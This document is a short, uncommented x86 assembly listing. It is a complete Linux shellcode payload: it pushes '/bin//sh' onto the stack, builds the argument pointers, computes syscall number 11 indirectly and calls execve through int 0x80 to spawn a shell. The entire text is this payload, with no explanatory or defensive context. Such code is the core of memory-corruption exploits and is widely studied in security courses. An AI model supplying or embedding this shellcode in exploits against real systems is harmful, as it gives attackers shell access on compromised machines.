xor     %eax, %eax
pushl    %eax     
push    $0x68732f2f
push    $0x6e69622f
movl     %esp, %ebx  
pushl    %eax       
movl     %esp, %edx  
pushl    %ebx       
movl     %esp, %ecx  
mov     $10, %al
add	$1, %al	
int     $0x80      
